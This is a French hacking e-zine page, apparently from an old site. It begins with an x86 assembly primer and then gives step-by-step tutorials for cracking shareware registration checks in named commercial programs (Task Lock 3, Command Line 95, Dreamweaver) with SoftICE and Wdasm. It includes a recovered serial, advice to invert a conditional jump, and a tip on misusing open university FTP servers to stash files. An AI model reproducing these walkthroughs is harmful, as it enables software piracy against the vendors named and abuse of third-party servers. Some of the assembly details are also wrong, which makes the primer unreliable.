Il est activ&eacute; si le r&eacute;sultat d'une op&eacute;ration donne un nombre 
n&eacute;gatif.<BR>11 : Overflow : OF. Il est mis &agrave; 1 si le signe d'un 
op&eacute;ration change alors qu'il ne devrait pas. ex: 2+2 = -4.<BR>- Indicateur 
de contr&ocirc;le<BR>8 : Trap : TF.<BR>9 : interruption : IF.<BR>10 : direction 
: DF. Il est modifi&eacute; par une instruction CLD ou STP (on verra, pas de souci...)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
Un registre &eacute;crit entre crochets ne repr&eacute;sente pas un suite de bits, 
mais le contenu d'une adresse qu'il pointe.<BR>Les registres a 32 bits on un E 
devant leur nom (EAX, EBX, ECX, EDX). Remarquons que AX= 655365 au maximum et 
AL=255, de plus la partie haute du registre ne peut &ecirc;tre modifi&eacute;s 
s&eacute;par&eacute;ment. Donc, on n'aura jamais EBH ou ECL. Les 3 autres cat&eacute;gories 
de registres n'ont pas de partie 8 bits et peuvent &ecirc;tre &eacute;tendus &agrave; 
32 bits en pr&eacute;c&eacute;dent leur nom d'un &quot;E&quot; &eacute;galement.<BR> 
Il existe deux types de programmes (on verra cela plus tard) : les COM et les 
EXE. La diff&eacute;rence est qu'un COM ne peut utilsier pas plus d'un segment 
de la m&eacute;moire (64K) et donc les 4 registres CS, DS, SS, ES ont la m&ecirc;me 
valeur. Les EXE, eux, peuvent travailer avec plusieurs segments. Passons maintenant 
aux instructions de base.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">---2. 
Les instructions de base---</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction la plus connue est sans doute l'instruction MOV. Elle permet de 
copier (et non pas d&eacute;placer) le contenu d'un registre dans un autre, ou 
de copier un nombre dans un registre, etc&#133;<BR>forme : mov dest,src<BR>ex 
: mov ax,bx copie le contenu de bx dans ax<BR>mov bx,4 met &quot;4&quot; dans 
bx</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">mov 
[bx],4 : met 4 &agrave; l'adresse sur laquelle pointe bx. Le probl&egrave;me est 
que on ne sait pas si &quot;4&quot; doit &ecirc;tre consid&eacute;r&eacute; comme<BR>un 
octet, deux octets, 4 octets... Lorsque l'on fait mov bx,4 on sait que l'op&eacute;ration 
se fera sur 16 bits, car c'est la<BR>taille du registre bx. Ici, il faut pr&eacute;ciser 
comme suit :<BR>mov byte ptr [bx],4 ou<BR>mov word ptr [bx],4</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">un 
word = un mot, c'est &agrave; dire deux octets (bytes)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction CMP<BR>Elle compare des registres ou des emplacements de m&eacute;moire. 
Selon le r&eacute;sultat, elle va changer quelques indicateurs. Si les<BR>deux 
op&eacute;randes sont &eacute;gaux, par exemple, le z&eacute;ro flag va entre 
autre &ecirc;tre mis &agrave; z&eacute;ro. On pourra g&eacute;rer ce r&eacute;sultat 
par un saut<BR> conditionnel.<BR>ex : cmp ax,bx</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
Les instructions INC et DEC<BR>Ajoute 1 &agrave; la valeur d'un registre. L'instruction 
dec fait l'inverse<BR>inc ax</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction ADD<BR>add ax,bx ajoute &agrave; ax le contenu de bx</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction NOP<BR>Nop veut dire non op&eacute;rate (c'est aussi un super cracker 
;), le processeur ne fait rien et l'ignore. Elle est tres utile pour<BR>patcher 
certaines instructions g&ecirc;nantes dans un logiciel.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction AND<BR>Elle effectue un ET logique en traitant les deux op&eacute;randes 
bit &agrave; bit... Un et logique donne 1 si les deux op&eacute;randes sont &agrave; 
1</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* L'instruction 
OR<BR>Elle effectue un ou logique. Elle retourne 1 si un des deux op&eacute;randes 
est &agrave; 1.<BR>Elle est souvent utilis&eacute;e pour tester qu'un registre 
est &agrave; 0. Or ax,ax ne renvoie 0 dans ax que si tous les bits de ax sont<BR>&agrave; 
z&eacute;ro. Le z&eacute;ro flag est affect&eacute;, et permet un branchement 
conditionnel.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction XOR<BR>Elle effectue un ou exclusif. Il faut que l'un des bits soit 
&agrave; 1, mais pas les deux.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction TEST<BR>Elle effectue un ET logique, mais ne modifie pas les op&eacute;randes. 
Seuls les indicateurs le sont. C'est un excellent moyen de<BR>v&eacute;rifier 
qu'un registre est &agrave; z&eacute;ro. (par test eax, eax par exemple)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>---3. 
Les instructions de branchement---</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction JMP<BR>Elle effectue un saut &agrave; l'adresse sp&eacute;cifi&eacute;e. 
Le programme continuera son ex&eacute;cution &agrave; l'adresse sp&eacute;cifi&eacute;e. 
Elle est<BR>l'&eacute;quivalent de la commande goto des langages de haut niveau.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
L'instruction CALL<BR>Elle appelle un sous programme &agrave; l'adresse sp&eacute;cifi&eacute;e. 
Celui-ci doit se terminer par une instruction RET qui dira au<BR>processeur de 
reprendre le programme apr&egrave;s le dernier CALL.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
Les sauts conditionnels<BR>Ils testent les flags pour savoir si un saut doit avoir 
lieu ou non.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">JE 
ou NZ : saute si le z&eacute;ro flag est &agrave; 1<BR>JNE ou JNZ : saute si le 
z&eacute;ro flag est &agrave; 0</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">CMP 
ax,bx met le z&eacute;ro flag &agrave; 1 si les deux registres ont la m&ecirc;me 
valeur<BR>JE 12345 saute &agrave; l'adresse 12345 si le z&eacute;ro flag est &agrave; 
1</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Il 
y a BEAUCOUP d'autres sauts conditionnels. Mais je ne peux tous vous les d&eacute;tailler 
ici.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">---4. 
La pile---</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">La 
pile est une zone m&eacute;moire qui sert &agrave; stocker temporairement des 
donn&eacute;es. On peut rajouter une donn&eacute;e en l'empilant, et en <BR>lire 
une en la d&eacute;pilant. On ne peut donc que lire la derni&egrave;re donn&eacute;e 
sur la la pile. C'est une structure de type LIFO : Last In First Out. Le dernier 
&eacute;l&eacute;ment de la pile est &agrave; l'adresse SS:PP. Il ne faut pas 
modifier PP directement, il faut utiliser les instructions d'empilage et de d&eacute;pilage. 
L'instruction d'empilage est push push ax ajoute la valeur de ax &agrave; la pile<BR>L'instruction 
de d&eacute;sempilage est pop pop ax met dans ax la valeur du dernier &eacute;l&eacute;ment 
de la pile</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">====================</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Voil&agrave;, 
j'esp&egrave;re que vous vous &ecirc;tes un peu familiaris&eacute; avec l'assembleur. 
Pour commencer &agrave; cracker, vous n'avez pas besoin de<BR>conna&icirc;tre 
tout ce cours. Achetez un livre de r&eacute;f&eacute;rence sur l'assembleur et 
vous apprendrez au fur et &agrave; mesure, en craquant.<BR>Pas de souci, le prochain 
article sera &quot;CRACKING : PAS A PAS&quot;. Faites moi confiance, je viens 
de cracker Paint Shop Pro 7.02 et Winzip 8 ;-)<BR>D'ailleurs, on est parti pour 
une premi&egrave;re approche de cracking.<BR> </FONT></P><P></P><P></P><P></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Le 
cracking est l'art de d&eacute;plomber des logiciels prot&eacute;g&eacute; ou 
limit&eacute; en contournant le syst&egrave;me de protection. Ne vous &ecirc;tes-vous 
jamais demand&eacute; comment certains hackers font pour avoir les num&eacute;ros 
de s&eacute;rie de certains logiciels ? Il est possible de r&eacute;cup&eacute;rer 
le code d'enregistrement dans le programme. Cette technique s'appelle le reversing. 
D&eacute;monstration.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">INTRODUCTION<BR>--------------------------------<BR>La 
cracking a pour but de contourner les protections par code d'enregistrement ou 
par &quot;time limit&quot;, dispositif int&eacute;gr&eacute; dans le logiciel 
qui le bloque au bout d'une certaine p&eacute;riode d'essai. En cracking, on distingue 
deux types d'attaques diff&eacute;rentes:<BR>- le dead listing, qui consiste &agrave; 
inverser la routine de v&eacute;rification d'un num&eacute;ro de s&eacute;rie, 
en faisant passer tous les mauvais pour des bons (et donc le seul bon pour tous 
les mauvais!)<BR>- le patching dont le but est de d&eacute;sactiver tout ce qui, 
dans le programme, l'assimile &agrave; un shareware (nom inconnu, nag screen...) 
pour feinter le logiciel qui croira qu'on lui a donner le num&eacute;ro de s&eacute;rie 
et donc qu'il se d&eacute;bloquera tout seul.<BR>Tout cela demande d'analyser 
le programme en assembleur. Cela reste l&eacute;gal tant qu'on s'adonne &agrave; 
ces arts dans un cadre strictement personnel. Le reversing, lui, a pour but de 
s'infiltrer dans le programme pour d&eacute;niche et d&eacute;coder le serial 
number (et ce n'est s&ucirc;rement pas en lisant des revues qui en jettent pleins 
la vue et t&ecirc;te de mort se m&ecirc;lent avec les BD qu'on y parviendra).<BR>Pour 
cela, il faut une protection simple, c'est-&agrave;-dire un code qui est toujours 
le m&ecirc;me (les autres protections, c'est pas la m&ecirc;me sauce...) Avant 
de foncer directement dans le tas t&ecirc;te baiss&eacute;e, on va d'une part 
examiner une m&eacute;thode de cracking d'un programme, simple, classique, que 
conna&icirc;t pour crackeur qui se respecte (crackeur de son propre logiciel dans 
le but de s'en faire une copie de sauvegarde, &eacute;videmment, et &agrave; des 
fin strictement personnel), puis, on abordera la technique du reversing.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">METHODE 
UN<BR>--------------------------<BR>La victime de notre attaque sera le logiciel 
Task Lock 3 qui contient un simple serial number en guise de protection. C'est 
un logiciel vieux, ce qui &eacute;vitera le piratage idiot que certains pourrait 
faire suite &agrave; la lecture de cet article (ce type de protection est de plus 
en plus bannie pour sa flagrante inutilit&eacute;) ; de toute fa&ccedil;on, le 
but est uniquement de comprendre la m&eacute;thode. Nous aurons besoin de l'un 
des plus puissants d&eacute;buggeur au monde : SoftICE. <BR> Evidemment, on arrivera 
&agrave; rien si l'on ne r&eacute;cup&egrave;re pas quelques infos indispensable 
sur le logiciel-cible, sur sa nature, sa structure et l'agencement de sa protection. 
Dans notre recherche, on apprend entre autres que c'est une application 32 bits 
tournant sur Windows 9x et, dans le menu Register, une bo&icirc;te de dialogue 
nous demande le code d'enregistrement. Dans l'aide on apprend qu'il est possible 
de s'enregistrer soit individuellement, soit en plate-forme, donc on aura logiquement 
deux recherches &agrave; effectuer pour cracker le programme.<BR> Le moins idiot 
est de poser un points d'arr&ecirc;ts (on suppose que nos lecteurs savent se servir 
d'un debugger... un point d'arr&ecirc;t, ou breakpoint, et un sorte de rep&egrave;re 
que l'on implante dans le logiciel sur une fonction pr&eacute;cise et qui se d&eacute;clenche 
quand cette fonction est activ&eacute;e, afin de d&eacute;nicher o&ugrave; elle 
est appel&eacute;e et ainsi de pouvoir falsifier la routine de v&eacute;rification 
de mot de passe, par exemple) sur la fonction &quot;GetDlgItemtext&quot; (... 
et qu'il connaissent les API Windows, bref qu'il ne soient pas des abrutis en 
informatique). SOus SoftICE, pour agir ainsi, utilisez la commande &quot;BPX + 
le-nom-de-la-fonction-ou-de-son-adresse-m&eacute;moire&quot; :<BR>:bpx getdlgitemtexta<BR>Si 
un message d'erreur (du style &quot;No LTD&quot;) appara&icirc;t, c'est qu'une 
tierce application tournent en t&acirc;che de fond. La commande &quot;bl&quot; 
permet d'afficher la liste des breakpoints.<BR>Voila : ce point d'arr&ecirc;t 
interceptera tous les appels de la fonction GetDlgItemtextA. Comme celle l&agrave; 
permet d'afficher une bo&icirc;te de dialogue, elle bloquera le programme avant 
qu'il n'affiche le message d'erreur pour nous informer que le num&eacute;ro de 
s&eacute;rie est invalide. On rep&egrave;rera ainsi l'endroit approximatif o&ugrave; 
est valid&eacute; le serial. Donc, maintenant, sous Task Lock, tentons un code 
et... &ccedil;a marche (sinon, c'est que notre breakpoint pointe une mauvaise 
fonction).<BR>Parenth&egrave;se : pour supprimer le breakpoint, il faut utiliser 
la commande <BR>: bc 0<BR>et pour le r&eacute;activer, remplacez &quot;bc&quot; 
par &quot;be&quot;.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
Dirigeons-nous alors vers l'endroit o&ugrave; la fonction est appel&eacute;e par 
F11 : nous sommes dans SGLSET.EXE. <BR>La premi&egrave;re ligne dans la fen&ecirc;tre 
de code doit avoir cette allure :<BR>CALL [user32!GetDlgItemTextA]<BR>D&eacute;placez-vous 
via Ctrl + HAUT. J'ai mis des commentaires, mais vous avez int&eacute;r&ecirc;t 
&agrave; apprendre l'assembleur si vous &ecirc;tes &agrave; la rue... sinon : 
pas d'assembleur pas de cracking et pas de reversing :(</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
RET <BR> PUSH EBP // d&eacute;but de la fonction <BR> MOV EBP, ESP<BR> SUB ESP<BR> 
PUSH ESI<BR> LEA EAX, [EBP-34] // EAX = EBP - 34 <BR> PUSH EDI <BR> MOV ESI, ECX<BR> 
PUSH 32 // sauve la longueur max. accept&eacute;e<BR> PUSH EAX // sauve la valeur 
EAX <BR> PUSH 000003F4 // sauve l'identificateur de contr&ocirc;le <BR> PUSH DWORD 
PTR [ESI+1C]<BR> CALL [user32!GetDlgItemTextA] // appel de la fonction </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">On 
note que le texte est sauvegard&eacute; en EAX et que EAX est &eacute;gal &agrave; 
EBP - 34. Donc, regardons la valeur &quot;EBP - 34&quot; en tapant : <BR> :d ebp-34 
<BR>La valeur s'afficher dans la fen&ecirc;tre de donn&eacute;es. Maintenant, 
il faut d&eacute;gotter l'endroit o&ugrave; notre code est compar&eacute; au code 
valable pour enregistrer le logiciel. Donc, on remonte dans le programme, instruction 
par instruction via F10 jusqu'&agrave; ce que l'on trouve quelque chose &agrave; 
propos de EBP-34 ... On obtient tr&egrave;s vite &ccedil;a :</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">LEA 
EAX, [EBP+FFFFFF64] // EAX = EBP-9C <BR>LEA ECX, [EBP-34] // ECX = EBP-34 <BR>PUSH 
EAX<BR>PUSH ECX<BR>CALL 00403DD0 // appel une fonction <BR>ADD ESP, 08 // efface 
l'info sauv&eacute;e <BR>TEST EAX, EAX<BR>JNZ 00402BC0 // (JNZ = Jump if Not Zero) 
: saute &agrave; l'adresse 00402BC0 si diff&eacute;rent de 0 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
On a une comparaison de cha&icirc;ne de caract&egrave;res fonctionnant ainsi : 
si les cha&icirc;nes sont &eacute;gales, le flag passe &agrave; 0, sinon non. 
C'est ici que les codes d'enregistrements sont compar&eacute;s.<BR>Calculons ce 
qui se cache derri&egrave;re notre valeur, [EBP+FFFFFF64]. SoftIce g&eacute;rant 
tr&egrave;s mal les nombres n&eacute;gatifs, donc, il faut le faire manuellement. 
Un peu de connaissance en hexa et on obtient :<BR> 100000000 - FFFFFF64 = 9C <BR>Pour 
savoir se qui se cache derri&egrave;re EBP-9C, tapons:<BR> : d ebp-9c <BR>La fen&ecirc;tre 
de donn&eacute;es nous donne une longue suite de nombre: c'est le bon code. Mais, 
si vous avez suivi, on a dit qu'on avait deux types d'enregistrements donc deux 
serials. Par cons&eacute;quent, apr&egrave;s avoir not&eacute; le code obtenu, 
on remonte avec F10 encore jusqu'&agrave; obtenir autre chose concernant EBP-34, 
et finalement on arrive &agrave; &ccedil;a:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">LEA 
EAX, [EBP-68] // EAX = EBP - 68 <BR>LEA ECX, [EBP-34] // ECX = EBP - 34 <BR>PUSH 
EAX // sauve EAX <BR>PUSH ECX // sauve ECX <BR>CALL 00403DD0 // appel une fonction 
<BR>ADD ESP, 08 // efface l'info sauvegard&eacute;e <BR>TEST EAX, EAX<BR>JNZ 00402BFF 
// saute si diff&eacute;rent de 0 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Et 
&agrave; l'adresse EBP-68 on trouve quoi? Mais oui, notre code d'enregistrement. 
Il ne reste plus qu'&agrave; le faire. Tout devrait fonctionner.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">METHODE 
DEUX<BR>-------------------------------<BR>Nous venons de voir comment craqu&eacute; 
facilement un programme. On va voir maintenant comment obtenir le code d'enregistrement 
l&eacute;gal du logiciel. Entendons-bien : ce n'est pas du cracking, mais du reversing 
: examiner le programme, sans le toucher, afin d'y r&eacute;cup&eacute;rer le 
num&eacute;ro de s&eacute;rie. Bien s&ucirc;r, cela n'est &agrave; faire que sur 
vos propres logiciels. A bon entendeur...</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
Changeons. Le programme-cible, cette fois, est Command Line 95. C'est une application 
32 bit avec un code d'enregistrement tout b&ecirc;te. On fait comme Tasklock pour 
les breakpoints, on en pose deux : &agrave; la fois sur GetWindowTextA et sur 
GetDlgItemTextA<BR> : bpx getwindowtexta <BR> : bpx getdlgitemtexta <BR>Allez 
vous enregistrer et le programme bloque sur GetDlgItemTextA. On se sert de F11 
pour retourner &agrave; la fonction d'appel. Ensuite, on se sert de CTRL + HAUT 
pour arriver au code suivant : </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">MOV 
ESI, [ESP+0C] // longueur max.<BR>PUSH 1E<BR>PUSH 0040A680<BR>PUSH 000003ED<BR>PUSH 
ESI<BR>CALL [User32!GetDlgItemTextA] // appel de la fonction </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Le 
nombre 40A680 semble int&eacute;ressant, voyons sa valeur : <BR> : d 40a680 <BR>Dans 
la fen&ecirc;tre de donn&eacute;es, on obtient, si un nom n'est pas saisi : </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">PUSH 
00 <BR>PUSH 00<BR>PUSH 000003F6 <BR>MOV EDI, 0040A680<BR>PUSH ESI<BR>CALL [User32!GetDlgItemInt] 
// appel de la fonction (elle est similaire &agrave; GetDlgItemText)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Cette 
fonction n&eacute;cessite une r&eacute;f&eacute;rence de la boite d'&eacute;dition. 
Il est stock&eacute; en EAX et si l'on regarde la fen&ecirc;tre de registres, 
on peut lire : <BR> EAX = 00003039 <BR>Convertissons le chiffre hexad&eacute;cimal 
3039 via la commande : <BR> : ? 3039 <BR>et l'on s'aper&ccedil;oit que cela vaut 
&quot;0000012345&quot; en D&eacute;c et &quot;09&quot; en ASCII : c'est le code 
&quot;bidon&quot; qu'on a entr&eacute; tout &agrave; l'heure. Dans le suite de 
logiciel, on remarque que ce code est sauvegard&eacute;:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">MOV 
[0040A548], EAX<BR>MOV EDX, EAX</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">En 
dessous, on note que le code est calcul&eacute;...</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">MOV 
ECX, FFFFFFFF // calcul de la longueur de la cha&icirc;ne <BR>SUB EAX, EAX //<BR>REPNZ 
SCASB //<BR>NOT ECX //<BR>DEC ECX // ECX contient la valeur de la longueur <BR>MOVSX 
EAX, BYTE PTR [0040A680]<BR>IMUL ECX, EAX // ECX = ECX * EAX <BR>SHL ECX, 0A // 
d&eacute;calage logique &agrave; gauche de 0A <BR>ADD ECX, 0002F8CC // ajoute 
2F8CC au r&eacute;sultat <BR>MOV [0040A664], ECX</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">... 
puis valid&eacute;.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">CMP 
ECX, EDX // comparaison des codes <BR>JZ 00402DA6 // si &eacute;gal &agrave; 0, 
saut </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Pour 
conna&icirc;tre, le code, il suffit donc de conna&icirc;tre, non la valeur de 
EAX, mais de ECX : <BR> : ? ECX <BR>Pour notre code, &ccedil;a donne : &quot;0000901324&quot;. 
Donc le bon code est : 901324. Enregistrez-vous avec celui-l&agrave; et... ca 
roule.</FONT></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">LA 
MORALE <BR>----------<BR>C'est archi simple. Il suffit de rentrer un code bidon, 
de rep&eacute;rer l'endroit o&ugrave; il est utilis&eacute; dans le programme 
et de le suivre pour voir ce qu'il devient. C'est pas compliqu&eacute;, mais tr&egrave;s 
utile pour comprendre l'architecture d'un programme en assembleur. Donc, la solution 
est : NE CRACKER PAS, faites du reversing sur votre propres programmes, c'est 
pas trop dur et instructif. Evidemment, quand on s'en prend &agrave; des logiciels 
plus commercial, du style Paint Shop Pro et compagnie, ce n'est plus une mince 
affaire... mais, vous le constaterez bient&ocirc;t, rien n'est impossible. L'architecte 
des Twin Towers l'a tr&egrave;s bien compris: rien n'est indestructible ;)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">***************<BR>Question 
: Comment faire pour planquer des fichiers sur Internet quand on ne poss&egrave;de 
pas de site ?<BR>R&eacute;ponse : utiliser les FTP de prestigieuse universit&eacute; 
(allemande et anglaise) qui n'ont AUCUNE protection FTP. Jugez plut&ocirc;t:<BR>ftp.rz.uni-wuerzburg.de 
(universit&eacute; allemande)<BR>ftp.mcc.ac.uk (Manchester Computing - Royaume-Uni)<BR>ftp.gwdg.de 
(Univ allemande )<BR>ftp.cs.ubc.ca (Computer Science University of British Columbia)<BR>Ces 
trois sites acceptent n'importe quel anonyme se balader sur leur site... Sympa, 
les gars! Mieux que Microsoft, faut faire fort!</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR> 
</FONT></P><P></P><P></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>Vous 
connaissez les num&eacute;ros de s&eacute;ries juste pour les r&eacute;cup&eacute;rer 
sur le Web pour vos programmes... Mais comment &ccedil;a marche, en fait? Voici 
l'ultime article bilan sur les S&eacute;rial Number.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">I.INTRODUCTION<BR>----------------<BR> 
De nos jours, l'id&eacute;e de gratuit&eacute; n'existe plus. Chaque d&eacute;veloppeur 
prot&egrave;ge donc ses progs afin de se faire de l'argent en les diffusant en 
version shareware en g&eacute;n&eacute;ral.<BR> IL faut bien faire la diff&eacute;rence 
entre version d'essai transformable en version compl&egrave;te, de la version 
de d&eacute;monstration, qui n'est (th&eacute;oriquement) que tout ou partie de 
la version licenci&eacute;e.<BR> En g&eacute;n&eacute;ral, il suffit d'entrer 
un s&eacute;rial dans la bo&icirc;te d'enregistrement pour transformer le shareware 
en version d&eacute;finitive. Ce s&eacute;rial peut se communiquer par t&eacute;l&eacute;phone, 
courrier, mail...<BR> Il y a diff&eacute;rents types de shareware :<BR>-les times 
limits (version d'essai &agrave; dur&eacute;e d&eacute;termin&eacute;e):le prog 
est utilisable pendant une p&eacute;riode limite (en g&eacute;n&eacute;ral 30 
jours, 1E en hexa)<BR>-les fonctions d&eacute;sactiv&eacute;es ou manquantes: 
le prog n'est pas utilisable dans son int&eacute;gralit&eacute;.<BR> Le s&eacute;rial 
peut &ecirc;tre compos&eacute; d'une combinaison num&eacute;rique, alphab&eacute;tique, 
alphanum&eacute;rique ou de cha&icirc;ne s&eacute;par&eacute; par des tirets (-). 
Il peut &ecirc;tre unique ou personnalis&eacute; &agrave; partir des crit&egrave;re 
Nom: un code diff&eacute;rent est g&eacute;n&eacute;r&eacute; pour chaque user. 
Des logiciels comme Super Snooper lisent toutes les cha&icirc;nes alphanum&eacute;riques 
contenues dans un ex&eacute;cutable afin de d&eacute;gotter le serial sans avoir 
a &eacute;diter le prog avec un logiciel hexa.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
Prenons le cas du programmes DreamWeaver. <BR>Le code est en toute lettre, non 
cod&eacute;, dans l'ex&eacute;cutable. A d&eacute;faut de Super Snooper, un d&eacute;sassemblage 
de DreamWaever.exe avec Wdasm me donne ce s&eacute;rial dans l'une des &quot; 
String data r&eacute;f&eacute;rences &quot; !</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Dans 
certain cas, le programme va attendre l'entr&eacute;e d'un num&eacute;ro de s&eacute;rie 
comportant des caract&egrave;res sp&eacute;ciaux, comme les s&eacute;parateurs 
(-):</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
Referenced by a (U)nconditional or (C)onditional Jump at Address:<BR>|:00409850(U)<BR>|<BR>:0040983A 
3BCF cmp ecx, edi -&gt; edi = nombre de caract&egrave;res du code<BR>:0040983C 
7314 jnb 00409852&amp;#9; -&gt; jump vers v&eacute;rification du code<BR>:0040983E 
803A2D cmp byte ptr [edx], 2D -&gt; recherche de &quot; - &quot;<BR>:00409841 
7506 jne 00409849 -&gt; sinon continue</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
Referenced by a (U)nconditional or (C)onditional Jump at Address:<BR>|:00409847(C)<BR>|<BR>:00409843 
42 inc edx -&gt; caract&egrave;re suivant<BR>:00409844 803A2D cmp byte ptr [edx], 
2D -&gt; [edx] = notre code<BR>:00409847 74FA je 00409843 -&gt; boucle</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
Referenced by a (U)nconditional or (C)onditional Jump at Address:<BR>|:00409841(C)<BR>|<BR>:00409849 
8A02 mov al, byte ptr [edx]-&gt; un caract&egrave;re dans AL<BR>:0040984B 41 inc 
ecx -&gt; compteur de boucle<BR>:0040984C 42 inc edx -&gt; caract&egrave;re suivant<BR>:0040984D 
8841FF mov byte ptr [ecx-01], al -&gt; r&eacute;&eacute;crit le code ailleurs 
<BR>:00409850 EBE8 jmp 0040983A -&gt; boucle</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">* 
Referenced by a (U)nconditional or (C)onditional Jump at Address:<BR>|:0040983C(C)<BR>|<BR>:00409852 
53 push ebx<BR>:00409853 C60100 mov byte ptr [ecx], 00<BR>:00409856 6A32 push 
00000032<BR>:00409858 8D4E44 lea ecx, dword ptr [esi+44]<BR>:0040985B E885CF0100 
call 004267E5<BR>:00409860 50 push eax -&gt; notre UserName<BR>:00409861 8BCD 
mov ecx, ebp<BR>:00409863 E8088DFFFF call 00402570-&gt; calcul du s&eacute;rial 
number :)<BR>:00409868 8BF8 mov edi, eax<BR>:0040986A 6AFF push FFFFFFFF<BR>:0040986C 
8D4E44 lea ecx, dword ptr [esi+44]<BR>:0040986F E8B2CF0100 call 00426826-&gt; 
comparaison avec notre code<BR>:00409874 85FF test edi, edi<BR>:00409876 0F84C200000je 
0040993E-&gt; vers &quot; code invalide &quot;<BR>:0040987C 53 push ebx d&eacute;but 
de code valide<BR>:0040987D 8BCD mov ecx, ebp<BR>:0040987F C785F400000001000000 
mov dword ptr [ebp+000000F4], 00000001<BR>:00409889 C785F800000000000000 mov dword 
ptr [ebp+000000F8], 00000000<BR>* Possible StringData Ref from Data Obj -&gt;&quot;RegistrationKey&quot;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">En 
0040983A, la cible va v&eacute;rifier que ce code comprend bien des &quot;-&quot; 
-&gt; cmp byte ptr [edx],2D<BR>(2D &eacute;tant &eacute;gal au symbole &quot;-&quot;). 
Donc notre code doit en comporter (deux pr&eacute;cis&eacute;ment). Si vous entrez 
un num&eacute;ro de s&eacute;rie du genre &quot;1234-1234-1234&quot;, vous passerez 
tous ces tests avec succ&egrave;s.<BR> Un peu plus loin un call 00402570 va calculer 
le num&eacute;ro de s&eacute;rie d'apr&egrave;s le nom que vous aurez entr&eacute;.<BR> 
A suivre, vous verrez un call 00426826. C'est lui qui va contr&ocirc;ler la validit&eacute; 
de votre code, et en cas d'inexactitude, cr&eacute;er un branchement par un je 
0040993E -&gt; code invalide<BR>Si on inverse le saut (je -&gt; jne), on verra 
